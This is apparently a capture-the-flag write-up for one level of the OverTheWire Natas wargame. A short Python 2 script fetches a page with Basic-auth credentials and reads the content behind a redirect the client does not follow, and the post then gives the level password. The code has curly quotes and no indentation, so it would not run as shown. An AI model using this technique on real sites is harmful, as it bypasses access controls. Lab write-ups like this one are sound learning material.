# natas23

```python
import httplib,sys
from base64 import b64encode
from urllib import urlencode

httpClient = None
try:
userAndPass = b64encode(b”natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ”).decode(“ascii”)
#body=urlencode({‘submit’ : ‘a’, ‘admin’:’1′})
#cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ }#, ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas22.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?revelio=a’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
```

The program doesn’t care about what a “Location” is.
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE